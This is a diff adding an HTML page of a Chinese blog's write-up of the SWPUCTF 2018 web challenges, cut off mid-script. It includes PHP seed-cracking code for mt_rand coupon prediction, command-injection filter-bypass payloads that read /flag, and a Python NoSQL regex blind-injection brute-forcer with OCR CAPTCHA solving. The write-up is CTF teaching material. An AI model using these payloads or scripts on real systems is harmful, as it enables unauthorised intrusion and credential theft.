@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="bak6ry">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="bak6ry">
+    <meta name="keywords" content="bak6ry | bak6ry">
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>SWPUCTF 2018 Web题和线下赛总结 · Bak6ry&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Bak6ry&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">SWPUCTF 2018 Web题和线下赛总结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Bak6ry's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            SWPUCTF 2018 Web题和线下赛总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">5,293</span>Reading time: <span class="post-count reading-time">26 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/01/03</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>线上赛<br>前言</p>
+<p>今年第一次打SWPU，发现web题目质量很不错，为了线下赛连续准备了两天，晚上都睡得很晚，这次比赛是西南石油的师傅举办的公益性比赛，学院不支持，自掏腰包办比赛，感谢西南石油的师傅们用心准备的web题和线下赛，以下是详细记录。</p>
+<p>Web</p>
+<p>用优惠码买个X?</p>
+<p>这个题发现<a href="http://www.zip下有个源码泄露，下载来发现代码如下：" target="_blank" rel="noopener">www.zip下有个源码泄露，下载来发现代码如下：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//生成优惠码</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line"></span><br><span class="line">function youhuima()&#123;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line"></span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"></span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $len=15;</span><br><span class="line"></span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line"></span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line"></span><br><span class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line"></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setcookie(&apos;Auth&apos;, $auth);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//support</span><br><span class="line"></span><br><span class="line">    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</span><br><span class="line"></span><br><span class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</span><br><span class="line"></span><br><span class="line">               //执行命令</span><br><span class="line"></span><br><span class="line">        &#125;else &#123;</span><br><span class="line"></span><br><span class="line">              //flag字段和某些字符被过滤!</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">             // 你的输入不正确!</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>使用mt_srand函数设置随机数种子，mt_rand函数来生成随机数。</p>
+<p>这里利用了这个伪随机数函数的漏洞，无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的。</p>
+<p>这里有个php的随机数的安全性分析：点我查看</p>
+<p>测试发现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function rrrand()&#123;</span><br><span class="line"></span><br><span class="line">$str = &quot;EbTyOzZEZeJAgmJ&quot;;</span><br><span class="line"></span><br><span class="line">$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line"></span><br><span class="line">   //整理成方便 php_mt_seed 测试的格式</span><br><span class="line"></span><br><span class="line">  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line"></span><br><span class="line">    if ($i &lt;= (15 / 2)) &#123;</span><br><span class="line"></span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line"></span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line"></span><br><span class="line">        $pos = 62 - $pos;</span><br><span class="line"></span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rrrand();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后发现题目注册用户登录后，会得到一个优惠码EbTyOzZEZeJAgmJ。</p>
+<p>然而在使用的时候会提示已失效，原因是15位的优惠码，这里要24位的，于是思路就是跑出随机数种子，然后用原来的脚本将位数跑到24位。</p>
+<p>于是使用工具php_mt_seed。</p>
+<p>下面演示破解过程,首先获得在每一位在字符串中的位置可以使用php_mt_seed这款工具进行爆破 但是需要一定的格式。</p>
+<p>附上自己的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function rrrand()&#123;</span><br><span class="line"></span><br><span class="line">$str = &quot;EbTyOzZEZeJAgmJ&quot;;</span><br><span class="line"></span><br><span class="line">$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line"></span><br><span class="line">   //整理成方便 php_mt_seed 测试的格式</span><br><span class="line"></span><br><span class="line">  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line"></span><br><span class="line">    if ($i &lt;= (15 / 2)) &#123;</span><br><span class="line"></span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line"></span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line"></span><br><span class="line">        $pos = 62 - $pos;</span><br><span class="line"></span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rrrand();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<p><img src="https://p0.ssl.qhimg.com/t015c25b399694e1ebd.png" alt=""></p>
+<p>将php_mt_seed.c放到kali里编译一下</p>
+<p>gcc -o 123 php_mt_seed (123为php_mt_seed.c文件编译后的文件名)</p>
+<p>chmod 777 123 赋予执行权限</p>
+<p>./123 40 40 0 61 1 1 0 61 55 55 0 61 24 24 0 61 50 50 0 61 25 25 0 61 61 61 0 61 40 40 0 61 1 1 0 61 58 58 0 61 17 17 0 61 26 26 0 61 56 56 0 61 50 50 0 61 17 17 0 61</p>
+<p><img src="https://p1.ssl.qhimg.com/t014fe4cc86e86e05aa.png" alt=""></p>
+<p>跑出随机数种子8228378 (PHP 7.1.0+)</p>
+<p>经过测试发现 php7.0和php7.2同一种子生成的随机数序列是</p>
+<p>不一样的</p>
+<p>刚好通过返回包可以看的php版本7.2所以这里要注意个问题，跑脚本的时候运行环境不对跑出来就会是错的</p>
+<p>用随机数种子去生成优惠码的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//生成优惠码</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;seed&apos;]=813929762;</span><br><span class="line"></span><br><span class="line">function youhuima()&#123;</span><br><span class="line"></span><br><span class="line">    mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line"></span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"></span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $len=24;</span><br><span class="line"></span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line"></span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line"></span><br><span class="line">            $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line"></span><br><span class="line">            $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $auth;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">youhuima();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行的结果为</p>
+<p><img src="https://p0.ssl.qhimg.com/t017f9a42c771444193.png" alt=""></p>
+<p>EbTyOzZEbWr0UmJmbVMOMYOQ</p>
+<p>进入第二关</p>
+<p>if (preg_match(“/^\d+.\d+.\d+.\d+$/im”,$ip)){</p>
+<pre><code>if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+
+       //执行命令
+
+}else {
+
+      //flag字段和某些字符被过滤!
+
+}
+</code></pre><p>}else{</p>
+<pre><code>// 你的输入不正确!
+</code></pre><p>}</p>
+<p>限制了ip的格式但是这里使用换行符%0a即可轻松绕过，匹配ip时用了/m 且^ $必须匹配头尾，%0a换行绕过检测，关键词过滤:发现通配符?以及*都被过滤</p>
+<p>c\at /fl\ag</p>
+<p>a=c b=at c=fl d=ag $a$b$c$d变量赋值法去绕过</p>
+<p>payload:127.0.0.1%0aa=c b=at c=fl d=ag $a$b$c$d</p>
+<p>payload:127.0.0.1%0ac\at /fl\ag</p>
+<p>要想读到/flag中的内容 但是flag字符串也被过滤了</p>
+<p>可以以通过 f’la’g 或f[l][a]g等来绕过</p>
+<p>payload:127.0.0.1%0ac’a’t /f’la’g</p>
+<p>Injection ???</p>
+<p>题目提示了</p>
+<p>infio.php查看下去，发现</p>
+<p>猜测题目应该使用了MongoDB</p>
+<p>那么应该可以判断为NoSQL注入</p>
+<p>那么进行盲注：</p>
+<p>尝试注入username=admin&amp;password[$regex]=^**</p>
+<p>这里队友写了一个爆破脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">import pytesseract</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">from urllib.request import urlretrieve</span><br><span class="line"></span><br><span class="line">j=0</span><br><span class="line"></span><br><span class="line">passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]</span><br><span class="line"></span><br><span class="line">payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;</span><br><span class="line"></span><br><span class="line">url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun&#123;&#125;&amp;vertify=&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line">img_url = &apos;http://123.206.213.66:45678/vertify.php&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line"></span><br><span class="line">    while j&lt;len(payload):</span><br><span class="line"></span><br><span class="line">        s = requests.session()</span><br><span class="line"></span><br><span class="line">        payloads = payload[j]</span><br><span class="line"></span><br><span class="line">        with open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;,&apos;wb&apos;) as fd:</span><br><span class="line"></span><br><span class="line">            img_1 = s.get(url=img_url)</span><br><span class="line"></span><br><span class="line">            fd.write(img_1.content)</span><br><span class="line"></span><br><span class="line">        image = Image.open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;)</span><br><span class="line"></span><br><span class="line">        vcode = pytesseract.image_to_string(image)</span><br><span class="line"></span><br><span class="line">        url_1 = url.format(str(payloads),vcode)</span><br><span class="line"></span><br><span class="line">        r = s.get(url_1,cookies=img_1.cookies)</span><br><span class="line"></span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line">        if &quot;wrong CAPTCHA!&quot; in r.text:</span><br><span class="line"></span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        if &quot;username or password incorrect!&quot; in r.text:</span><br><span class="line"></span><br><span class="line">            print(payloads)</span><br><span class="line"></span><br><span class="line">            j = j+1</span><br><span class="line"></span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if &quot;Nice!But it is not the real passwd&quot; in r.text:</span><br><span class="line"></span><br><span class="line">            passw0rd.append(payloads)</span><br><span class="line"></span><br><span class="line">            print(&quot;passw0rd is :&quot; + str(passw0rd))</span><br><span class="line"></span><br><span 